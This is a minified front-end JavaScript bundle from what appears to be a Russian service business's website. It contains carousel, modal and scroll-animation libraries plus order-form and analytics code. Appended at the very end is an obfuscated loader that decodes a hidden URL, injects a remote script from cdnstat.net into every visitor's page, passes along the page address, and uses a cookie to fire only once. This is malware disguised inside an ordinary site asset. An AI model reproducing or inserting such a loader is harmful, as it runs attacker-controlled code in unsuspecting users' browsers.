                    e.location.hash = o
                }
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this.$element.on(this._handlers), t(e).on("hashchange.owl.navigation", t.proxy((function(t) {
            var n = e.location.hash.substring(1),
                i = this._core.$stage.children(),
                o = this._hashes[n] && i.index(this._hashes[n]);
            undefined !== o && o !== this._core.current() && this._core.to(this._core.relative(o), !1, !0)
        }), this))
    };
    o.Defaults = {
        URLhashListener: !1
    }, o.prototype.destroy = function() {
        var n, i;
        for (n in t(e).off("hashchange.owl.navigation"), this._handlers) this._core.$element.off(n, this._handlers[n]);
        for (i in Object.getOwnPropertyNames(this)) "function" != typeof this[i] && (this[i] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.Hash = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    function o(e, n) {
        var i = !1,
            o = e.charAt(0).toUpperCase() + e.slice(1);
        return t.each((e + " " + a.join(o + " ") + o).split(" "), (function(t, e) {
            if (undefined !== s[e]) return i = !n || e, !1
        })), i
    }

    function r(t) {
        return o(t, !0)
    }
    var s = t("<support>").get(0).style,
        a = "Webkit Moz O ms".split(" "),
        l = {
            transition: {
                end: {
                    WebkitTransition: "webkitTransitionEnd",
                    MozTransition: "transitionend",
                    OTransition: "oTransitionEnd",
                    transition: "transitionend"
                }
            },
            animation: {
                end: {
                    WebkitAnimation: "webkitAnimationEnd",
                    MozAnimation: "animationend",
                    OAnimation: "oAnimationEnd",
                    animation: "animationend"
                }
            }
        },
        c = function() {
            return !!o("transform")
        },
        u = function() {
            return !!o("perspective")
        },
        p = function() {
            return !!o("animation")
        };
    (function() {
        return !!o("transition")
    })() && (t.support.transition = new String(r("transition")), t.support.transition.end = l.transition.end[t.support.transition]), p() && (t.support.animation = new String(r("animation")), t.support.animation.end = l.animation.end[t.support.animation]), c() && (t.support.transform = new String(r("transform")), t.support.transform3d = u())
}(window.Zepto || window.jQuery, window, document),
function(t) {
    "object" == typeof module && "object" == typeof module.exports ? t(require("jquery"), window, document) : t(jQuery, window, document)
}((function(t, e, n, i) {
    var o = [],
        r = function() {
            return o.length ? o[o.length - 1] : null
        },
        s = function() {
            var t, e = !1;
            for (t = o.length - 1; t >= 0; t--) o[t].$blocker && (o[t].$blocker.toggleClass("current", !e).toggleClass("behind", e), e = !0)
        };
    t.modal = function(e, n) {
        var i, s;
        if (this.$body = t("body"), this.options = t.extend({}, t.modal.defaults, n), this.options.doFade = !isNaN(parseInt(this.options.fadeDuration, 10)), this.$blocker = null, this.options.closeExisting)
            for (; t.modal.isActive();) t.modal.close();
        if (o.push(this), e.is("a"))
            if (s = e.attr("href"), this.anchor = e, /^#/.test(s)) {
                if (this.$elm = t(s), 1 !== this.$elm.length) return null;
                this.$body.append(this.$elm), this.open()
            } else this.$elm = t("<div>"), this.$body.append(this.$elm), i = function(t, e) {
                e.elm.remove()
            }, this.showSpinner(), e.trigger(t.modal.AJAX_SEND), t.get(s).done((function(n) {
                if (t.modal.isActive()) {
                    e.trigger(t.modal.AJAX_SUCCESS);
                    var o = r();
                    o.$elm.empty().append(n).on(t.modal.CLOSE, i), o.hideSpinner(), o.open(), e.trigger(t.modal.AJAX_COMPLETE)
                }
            })).fail((function() {
                e.trigger(t.modal.AJAX_FAIL), r().hideSpinner(), o.pop(), e.trigger(t.modal.AJAX_COMPLETE)
            }));
        else this.$elm = e, this.anchor = e, this.$body.append(this.$elm), this.open()
    }, t.modal.prototype = {
        constructor: t.modal,
        open: function() {
            var e = this;
            this.block(), this.anchor.blur(), this.options.doFade ? setTimeout((function() {
                e.show()
            }), this.options.fadeDuration * this.options.fadeDelay) : this.show(), t(n).off("keydown.modal").on("keydown.modal", (function(t) {
                var e = r();
                27 === t.which && e.options.escapeClose && e.close()
            })), this.options.clickClose && this.$blocker.click((function(e) {
                e.target === this && t.modal.close()
            }))
        },
        close: function() {
            o.pop(), this.unblock(), this.hide(), t.modal.isActive() || t(n).off("keydown.modal")
        },
        block: function() {
            this.$elm.trigger(t.modal.BEFORE_BLOCK, [this._ctx()]), this.$body.css("overflow", "hidden"), this.$blocker = t('<div class="' + this.options.blockerClass + ' blocker current"></div>').appendTo(this.$body), s(), this.options.doFade && this.$blocker.css("opacity", 0).animate({
                opacity: 1
            }, this.options.fadeDuration), this.$elm.trigger(t.modal.BLOCK, [this._ctx()])
        },
        unblock: function(e) {
            !e && this.options.doFade ? this.$blocker.fadeOut(this.options.fadeDuration, this.unblock.bind(this, !0)) : (this.$blocker.children().appendTo(this.$body), this.$blocker.remove(), this.$blocker = null, s(), t.modal.isActive() || this.$body.css("overflow", ""))
        },
        show: function() {
            this.$elm.trigger(t.modal.BEFORE_OPEN, [this._ctx()]), this.options.showClose && (this.closeButton = t('<a href="#close-modal" rel="modal:close" class="close-modal ' + this.options.closeClass + '">' + this.options.closeText + "</a>"), this.$elm.append(this.closeButton)), this.$elm.addClass(this.options.modalClass).appendTo(this.$blocker), this.options.doFade ? this.$elm.css({
                opacity: 0,
                display: "inline-block"
            }).animate({
                opacity: 1
            }, this.options.fadeDuration) : this.$elm.css("display", "inline-block"), this.$elm.trigger(t.modal.OPEN, [this._ctx()])
        },
        hide: function() {
            this.$elm.trigger(t.modal.BEFORE_CLOSE, [this._ctx()]), this.closeButton && this.closeButton.remove();
            var e = this;
            this.options.doFade ? this.$elm.fadeOut(this.options.fadeDuration, (function() {
                e.$elm.trigger(t.modal.AFTER_CLOSE, [e._ctx()])
            })) : this.$elm.hide(0, (function() {
                e.$elm.trigger(t.modal.AFTER_CLOSE, [e._ctx()])
            })), this.$elm.trigger(t.modal.CLOSE, [this._ctx()])
        },
        showSpinner: function() {
            this.options.showSpinner && (this.spinner = this.spinner || t('<div class="' + this.options.modalClass + '-spinner"></div>').append(this.options.spinnerHtml), this.$body.append(this.spinner), this.spinner.show())
        },
        hideSpinner: function() {
            this.spinner && this.spinner.remove()
        },
        _ctx: function() {
            return {
                elm: this.$elm,
                $elm: this.$elm,
                $blocker: this.$blocker,
                options: this.options
            }
        }
    }, t.modal.close = function(e) {
        if (t.modal.isActive()) {
            e && e.preventDefault();
            var n = r();
            return n.close(), n.$elm
        }
    }, t.modal.isActive = function() {
        return o.length > 0
    }, t.modal.getCurrent = r, t.modal.defaults = {
        closeExisting: !0,
        escapeClose: !0,
        clickClose: !0,
        closeText: "Close",
        closeClass: "",
        modalClass: "modal",
        blockerClass: "jquery-modal",
        spinnerHtml: '<div class="rect1"></div><div class="rect2"></div><div class="rect3"></div><div class="rect4"></div>',
        showSpinner: !0,
        showClose: !0,
        fadeDuration: null,
        fadeDelay: 1
    }, t.modal.BEFORE_BLOCK = "modal:before-block", t.modal.BLOCK = "modal:block", t.modal.BEFORE_OPEN = "modal:before-open", t.modal.OPEN = "modal:open", t.modal.BEFORE_CLOSE = "modal:before-close", t.modal.CLOSE = "modal:close", t.modal.AFTER_CLOSE = "modal:after-close", t.modal.AJAX_SEND = "modal:ajax:send", t.modal.AJAX_SUCCESS = "modal:ajax:success", t.modal.AJAX_FAIL = "modal:ajax:fail", t.modal.AJAX_COMPLETE = "modal:ajax:complete", t.fn.modal = function(e) {
        return 1 === this.length && new t.modal(this, e), this
    }, t(n).on("click.modal", 'a[rel~="modal:close"]', t.modal.close), t(n).on("click.modal", 'a[rel~="modal:open"]', (function(e) {
        e.preventDefault(), t(this).modal()
    }))
})),
/*! WOW - v1.1.3 - 2016-05-06
 * Copyright (c) 2016 Matthieu Aussaguel;*/
function() {
    var t, e, n, i, o, r = function(t, e) {
            return function() {
                return t.apply(e, arguments)
            }
        },
        s = [].indexOf || function(t) {
            for (var e = 0, n = this.length; n > e; e++)
                if (e in this && this[e] === t) return e;
            return -1
        };
    e = function() {
        function t() {}
        return t.prototype.extend = function(t, e) {
            var n, i;
            for (n in e) i = e[n], null == t[n] && (t[n] = i);
            return t
        }, t.prototype.isMobile = function(t) {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(t)
        }, t.prototype.createEvent = function(t, e, n, i) {
            var o;
            return null == e && (e = !1), null == n && (n = !1), null == i && (i = null), null != document.createEvent ? (o = document.createEvent("CustomEvent")).initCustomEvent(t, e, n, i) : null != document.createEventObject ? (o = document.createEventObject()).eventType = t : o.eventName = t, o
        }, t.prototype.emitEvent = function(t, e) {
            return null != t.dispatchEvent ? t.dispatchEvent(e) : e in (null != t) ? t[e]() : "on" + e in (null != t) ? t["on" + e]() : void 0
        }, t.prototype.addEvent = function(t, e, n) {
            return null != t.addEventListener ? t.addEventListener(e, n, !1) : null != t.attachEvent ? t.attachEvent("on" + e, n) : t[e] = n
        }, t.prototype.removeEvent = function(t, e, n) {
            return null != t.removeEventListener ? t.removeEventListener(e, n, !1) : null != t.detachEvent ? t.detachEvent("on" + e, n) : delete t[e]
        }, t.prototype.innerHeight = function() {
            return "innerHeight" in window ? window.innerHeight : document.documentElement.clientHeight
        }, t
    }(), n = this.WeakMap || this.MozWeakMap || (n = function() {
        function t() {
            this.keys = [], this.values = []
        }
        return t.prototype.get = function(t) {
            var e, n, i, o;
            for (e = n = 0, i = (o = this.keys).length; i > n; e = ++n)
                if (o[e] === t) return this.values[e]
        }, t.prototype.set = function(t, e) {
            var n, i, o, r;
            for (n = i = 0, o = (r = this.keys).length; o > i; n = ++i)
                if (r[n] === t) return void(this.values[n] = e);
            return this.keys.push(t), this.values.push(e)
        }, t
    }()), t = this.MutationObserver || this.WebkitMutationObserver || this.MozMutationObserver || (t = function() {
        function t() {
            "undefined" != typeof console && null !== console && console.warn("MutationObserver is not supported by your browser."), "undefined" != typeof console && null !== console && console.warn("WOW.js cannot detect dom mutations, please call .sync() after loading new content.")
        }
        return t.notSupported = !0, t.prototype.observe = function() {}, t
    }()), i = this.getComputedStyle || function(t, e) {
        return this.getPropertyValue = function(e) {
            var n;
            return "float" === e && (e = "styleFloat"), o.test(e) && e.replace(o, (function(t, e) {
                return e.toUpperCase()
            })), (null != (n = t.currentStyle) ? n[e] : void 0) || null
        }, this
    }, o = /(\-([a-z]){1})/g, this.WOW = function() {
        function o(t) {
            null == t && (t = {}), this.scrollCallback = r(this.scrollCallback, this), this.scrollHandler = r(this.scrollHandler, this), this.resetAnimation = r(this.resetAnimation, this), this.start = r(this.start, this), this.scrolled = !0, this.config = this.util().extend(t, this.defaults), null != t.scrollContainer && (this.config.scrollContainer = document.querySelector(t.scrollContainer)), this.animationNameCache = new n, this.wowEvent = this.util().createEvent(this.config.boxClass)
        }
        return o.prototype.defaults = {
            boxClass: "wow",
            animateClass: "animated",
            offset: 0,
            mobile: !0,
            live: !0,
            callback: null,
            scrollContainer: null
        }, o.prototype.init = function() {
            var t;
            return this.element = window.document.documentElement, "interactive" === (t = document.readyState) || "complete" === t ? this.start() : this.util().addEvent(document, "DOMContentLoaded", this.start), this.finished = []
        }, o.prototype.start = function() {
            var e, n, i, o;
            if (this.stopped = !1, this.boxes = function() {
                    var t, n, i, o;
                    for (o = [], t = 0, n = (i = this.element.querySelectorAll("." + this.config.boxClass)).length; n > t; t++) e = i[t], o.push(e);
                    return o
                }.call(this), this.all = function() {
                    var t, n, i, o;
                    for (o = [], t = 0, n = (i = this.boxes).length; n > t; t++) e = i[t], o.push(e);
                    return o
                }.call(this), this.boxes.length)
                if (this.disabled()) this.resetStyle();
                else
                    for (n = 0, i = (o = this.boxes).length; i > n; n++) e = o[n], this.applyStyle(e, !0);
            return this.disabled() || (this.util().addEvent(this.config.scrollContainer || window, "scroll", this.scrollHandler), this.util().addEvent(window, "resize", this.scrollHandler), this.interval = setInterval(this.scrollCallback, 50)), this.config.live ? new t(function(t) {
                return function(e) {
                    var n, i, o, r, s;
                    for (s = [], n = 0, i = e.length; i > n; n++) r = e[n], s.push(function() {
                        var t, e, n, i;
                        for (i = [], t = 0, e = (n = r.addedNodes || []).length; e > t; t++) o = n[t], i.push(this.doSync(o));
                        return i
                    }.call(t));
                    return s
                }
            }(this)).observe(document.body, {
                childList: !0,
                subtree: !0
            }) : void 0
        }, o.prototype.stop = function() {
            return this.stopped = !0, this.util().removeEvent(this.config.scrollContainer || window, "scroll", this.scrollHandler), this.util().removeEvent(window, "resize", this.scrollHandler), null != this.interval ? clearInterval(this.interval) : void 0
        }, o.prototype.sync = function(e) {
            return t.notSupported ? this.doSync(this.element) : void 0
        }, o.prototype.doSync = function(t) {
            var e, n, i, o, r;
            if (null == t && (t = this.element), 1 === t.nodeType) {
                for (r = [], n = 0, i = (o = (t = t.parentNode || t).querySelectorAll("." + this.config.boxClass)).length; i > n; n++) e = o[n], s.call(this.all, e) < 0 ? (this.boxes.push(e), this.all.push(e), this.stopped || this.disabled() ? this.resetStyle() : this.applyStyle(e, !0), r.push(this.scrolled = !0)) : r.push(void 0);
                return r
            }
        }, o.prototype.show = function(t) {
            return this.applyStyle(t), t.className = t.className + " " + this.config.animateClass, null != this.config.callback && this.config.callback(t), this.util().emitEvent(t, this.wowEvent), this.util().addEvent(t, "animationend", this.resetAnimation), this.util().addEvent(t, "oanimationend", this.resetAnimation), this.util().addEvent(t, "webkitAnimationEnd", this.resetAnimation), this.util().addEvent(t, "MSAnimationEnd", this.resetAnimation), t
        }, o.prototype.applyStyle = function(t, e) {
            var n, i, o;
            return i = t.getAttribute("data-wow-duration"), n = t.getAttribute("data-wow-delay"), o = t.getAttribute("data-wow-iteration"), this.animate(function(r) {
                return function() {
                    return r.customStyle(t, e, i, n, o)
                }
            }(this))
        }, o.prototype.animate = "requestAnimationFrame" in window ? function(t) {
            return window.requestAnimationFrame(t)
        } : function(t) {
            return t()
        }, o.prototype.resetStyle = function() {
            var t, e, n, i, o;
            for (o = [], e = 0, n = (i = this.boxes).length; n > e; e++) t = i[e], o.push(t.style.visibility = "visible");
            return o
        }, o.prototype.resetAnimation = function(t) {
            var e;
            return t.type.toLowerCase().indexOf("animationend") >= 0 ? (e = t.target || t.srcElement).className = e.className.replace(this.config.animateClass, "").trim() : void 0
        }, o.prototype.customStyle = function(t, e, n, i, o) {
            return e && this.cacheAnimationName(t), t.style.visibility = e ? "hidden" : "visible", n && this.vendorSet(t.style, {
                animationDuration: n
            }), i && this.vendorSet(t.style, {
                animationDelay: i
            }), o && this.vendorSet(t.style, {
                animationIterationCount: o
            }), this.vendorSet(t.style, {
                animationName: e ? "none" : this.cachedAnimationName(t)
            }), t
        }, o.prototype.vendors = ["moz", "webkit"], o.prototype.vendorSet = function(t, e) {
            var n, i, o, r;
            for (n in i = [], e) o = e[n], t["" + n] = o, i.push(function() {
                var e, i, s, a;
                for (a = [], e = 0, i = (s = this.vendors).length; i > e; e++) r = s[e], a.push(t["" + r + n.charAt(0).toUpperCase() + n.substr(1)] = o);
                return a
            }.call(this));
            return i
        }, o.prototype.vendorCSS = function(t, e) {
            var n, o, r, s, a, l;
            for (s = (a = i(t)).getPropertyCSSValue(e), n = 0, o = (r = this.vendors).length; o > n; n++) l = r[n], s = s || a.getPropertyCSSValue("-" + l + "-" + e);
            return s
        }, o.prototype.animationName = function(t) {
            var e;
            try {
                e = this.vendorCSS(t, "animation-name").cssText
            } catch (n) {
                e = i(t).getPropertyValue("animation-name")
            }
            return "none" === e ? "" : e
        }, o.prototype.cacheAnimationName = function(t) {
            return this.animationNameCache.set(t, this.animationName(t))
        }, o.prototype.cachedAnimationName = function(t) {
            return this.animationNameCache.get(t)
        }, o.prototype.scrollHandler = function() {
            return this.scrolled = !0
        }, o.prototype.scrollCallback = function() {
            var t;
            return !this.scrolled || (this.scrolled = !1, this.boxes = function() {
                var e, n, i, o;
                for (o = [], e = 0, n = (i = this.boxes).length; n > e; e++)(t = i[e]) && (this.isVisible(t) ? this.show(t) : o.push(t));
                return o
            }.call(this), this.boxes.length || this.config.live) ? void 0 : this.stop()
        }, o.prototype.offsetTop = function(t) {
            for (var e; void 0 === t.offsetTop;) t = t.parentNode;
            for (e = t.offsetTop; t = t.offsetParent;) e += t.offsetTop;
            return e
        }, o.prototype.isVisible = function(t) {
            var e, n, i, o, r;
            return n = t.getAttribute("data-wow-offset") || this.config.offset, o = (r = this.config.scrollContainer && this.config.scrollContainer.scrollTop || window.pageYOffset) + Math.min(this.element.clientHeight, this.util().innerHeight()) - n, e = (i = this.offsetTop(t)) + t.clientHeight, o >= i && e >= r
        }, o.prototype.util = function() {
            return null != this._util ? this._util : this._util = new e
        }, o.prototype.disabled = function() {
            return !this.config.mobile && this.util().isMobile(navigator.userAgent)
        }, o
    }()
}.call(this), window.send_calltouch = function(t) {
    try {
        var e = window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest,
            n = {};
        n.subject = "Заявка с " + location.hostname, n.comment = location.href, n.phoneNumber = t, n.sessionId = window.call_value;
        var i = Object.keys(n).reduce((function(t, e) {
            return n[e] && t.push(e + "=" + encodeURIComponent(n[e])), t
        }), []).join("&");
        t && (console.log(n), e.open("POST", "https://api.calltouch.ru/calls-service/RestAPI/requests/38500/register/", !0), e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), e.send(i))
    } catch (t) {
        console.log(t)
    }
}, $(document).ready((function() {
    var t, e;
    (t = window)[e = "getYamIdSendGoal"] = t[e] || function(e) {
            var n = Object.keys(t).filter((function(t) {
                return /^yaCounter.*?/i.test(t)
            }));
            for (var i in n) try {
                console.log(e), t[n[i]].reachGoal(e)
            } catch (t) {
                console.log(t.message)
            }
        },
        function() {
            var t = "data-goalid";
            $(document).on("click touchstart", "a", (function(e) {
                var n = $(this).attr(t),
                    i = $(this).attr("href");
                void 0 !== i && void 0 !== n && ($(document).find(i + " .order_submit").attr(t, n), $(document).find("div" + i + " a.btn").attr(t, n))
            }));
            var e = "form-error-border",
                n = "8 \\(\\d{3}\\) \\d{3}-\\d{2}-\\d{2}",
                i = (new RegExp(n, "g"), "input[name='phone']"),
                o = {
                    phone: {
                        selector: i,
                        value: ""
                    },
                    name: {
                        selector: "input[name='name']",
                        value: ""
                    },
                    message: {
                        selector: "textarea[name='message']",
                        value: ""
                    }
                },
                r = {
                    regex: n,
                    placeholder: "8 (___) ___-__-__",
                    showMaskOnHover: !0,
                    showMaskOnFocus: !0,
                    removeMaskOnSubmit: !0,
                    clearMaskOnLostFocus: !1,
                    clearIncomplete: !0,
                    autoUnmask: !1
                };
            $(document).on("focus hover", i, (function(t) {
                try {
                    Inputmask(r).mask(document.querySelectorAll(i))
                } catch (t) {
                    console.log(t.message)
                }
            })), $(document).on("click touch tap", "button.order_submit", (function(t) {
                t.preventDefault();
                var n = $(this),
                    i = $(this).closest("form"),
                    r = function(t) {
                        var e = new RegExp("\\d", "g");
                        if (e.test(t)) {
                            var n = t.match(e);
                            if (10 === n.length || 11 === n.length) return n.join("")
                        }
                        return !1
                    }(i.find(o.phone.selector).val());
                if (!r) return i.find(o.phone.selector).addClass(e), setTimeout((function() {
                    i.find(o.phone.selector).removeClass(e)
                }), 5e3), !1;
                for (var s in n.prop("disabled", !0), setTimeout((function() {
                        n.prop("disabled", !1)
                    }), 1500), o) o.hasOwnProperty(s) && i.find(o[s].selector).val() && (o[s].value = i.find(o[s].selector).val().trim());
                var a = ["name=", o.name.value, "&phone=", r, "&text= ", o.message.value].join("");
                $.ajax({
                    type: "POST",
                    dataType: "json",
                    url: "/request/order",
                    data: a,
                    success: function(t) {
                        if (i.trigger("reset"), !0 === t.status) {
                            $("div#modal-success").modal();
                            try {
                                window.send_calltouch(r)
                            } catch (t) {
                                console.log(t.message)
                            }
                            try {
                                _paq.push(["trackGoal", 1])
                            } catch (t) {
                                console.log(t.message)
                            }
                            try {
                                gtag("event", "Заказ через форму", {
                                    event_category: "button",
                                    event_action: "Orderdone"
                                })
                            } catch (t) {
                                console.log(t.message)
                            }
                            try {
                                ga("send", "event", "button", "Orderdone")
                            } catch (t) {
                                console.log(t.message)
                            }
                            try {
                                ym(90769775, "reachGoal", "zayav")
                            } catch (t) {
                                console.log(t.message)
                            }
                        } else {
                            $("div#modal-error").modal();
                            try {
                                _paq.push(["trackGoal", 2])
                            } catch (t) {
                                console.log(t.message)
                            }
                        }
                    }
                })
            }))
        }(), $("button.expand-btn").on("click", (function() {
            $("div.services-list__services__item-container.toggle").toggle("toggle"), $(this).find("img").toggleClass("hide")
        })), $("[data-fancybox]").fancybox({
            buttons: ["close"],
            clickOutside: "close"
        }), $(".menu-main a").on("click", (function(t) {
            var e = $(this);
            return $("html, body").stop().animate({
                scrollTop: $(e.attr("href")).offset().top += -50
            }, 777), t.preventDefault(), !1
        })), new WOW({
            offset: 70,
            mobile: !0,
            live: !0,
            callback: function(t) {},
            scrollContainer: null
        }).init(), $(document).on("click touch tap", "a[href^='#modal-']", (function(t) {
            try {
                $(this).modal({
                    fadeDuration: 200,
                    fadeDelay: .2
                })
            } catch (t) {
                console.log(t.message)
            }
            return !1
        })), $(".rbuttons li").on({
            mouseenter: function() {
                $(this).find("div.check").addClass("hover-radio-btn")
            },
            mouseleave: function() {
                $(this).find("div.check").removeClass("hover-radio-btn")
            }
        });
    var n = "#menu-fixed",
        i = "#menu-fixed-m";
    $((function(t) {
        t(window).scroll((function() {
            t(this).scrollTop() > 215 ? t(n).fadeIn(100) : t(this).scrollTop() < 215 && t(n).fadeOut(100)
        }))
    })), $((function(t) {
        t(window).scroll((function() {
            t(this).scrollTop() > 150 ? t(i).fadeIn(100) : t(this).scrollTop() < 150 && t(i).fadeOut(100)
        }))
    }));
    var o = $("#menu-fixed"),
        r = $("#caller_widget"),
        s = $(".modal");
    s.on($.modal.BLOCK, (function(t, e) {
        $(o).addClass("active"), $(r).addClass("active")
    })), s.on($.modal.AFTER_CLOSE, (function(t, e) {
        $(o).removeClass("active"), $(r).removeClass("active")
    }));
    var a, l, c, u, p, h = window.innerWidth - document.documentElement.clientWidth;
    $(document).on($.modal.BEFORE_BLOCK, (function(t, e) {
            $("body").css({
                "margin-right": h
            })
        })), $(document).on($.modal.AFTER_CLOSE, (function(t, e) {
            $("body").css({
                "margin-right": "0"
            })
        })), $(document).on("click", "label.personal-data", (function(t) {
            if ("INPUT" === t.target.tagName) {
                var e = $(this).closest("form"),
                    n = e.find("button.order_submit");
                e.find("input[name='privacy']").prop("checked") ? n.prop("disabled", !1) : n.prop("disabled", !0)
            }
        })),
        function() {
            var t = document.querySelector("body").getAttribute("data-device"),
                e = "wasWindowShown=1",
                n = "div#clickunder",
                i = r();

            function o(t) {
                return -1 !== document.cookie.indexOf(t)
            }

            function r() {
                return (new Date).getTime() / 1e3
            }
            if ("desktop" === t && !1 === o(e)) {
                $(document).bind("mouseleave", (function(t) {
                    t.pageY - $(window).scrollTop() <= 1 && !1 === o(e) && (document.cookie = e, $(n).modal())
                }));
                var s = setInterval((function() {
                    r() - i >= 15 && !1 === o(e) && (document.cookie = e, clearInterval(s), $(n).modal())
                }), 500);
                $(document).ready((function() {
                    for (var t = ["blur", "change", "click", "contextmenu", "copy", "cut", "dblclick", "focus", "focusin", "focusout", "keydown", "keypress", "keyup", "mousedown", "mouseenter", "mouseleave", "mousemove", "mouseout", "mouseover", "mouseup", "mousewheel", "paste", "resize", "scroll", "select", "textinput", "wheel"], e = 0; e < t.length; e++) $(document).bind(t[e], (function(t) {
                        i = r()
                    }))
                }))
            }
        }(), a = document.querySelector("body"), l = ".modal.order", c = "position", u = "width", p = navigator.userAgent, /iPad|iPhone|iPod/.test(p) && ($(document).on($.modal.BEFORE_OPEN, l, (function() {
            a.style.setProperty(c, "fixed"), a.style.setProperty(u, "100%")
        })), $(document).on($.modal.AFTER_CLOSE, l, (function(t) {
            a.style.removeProperty(c), a.style.removeProperty(u)
        })))
})), $(document).ready((function() {
    $("#caller_widget").delay(2500).fadeIn("slow")
}));
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));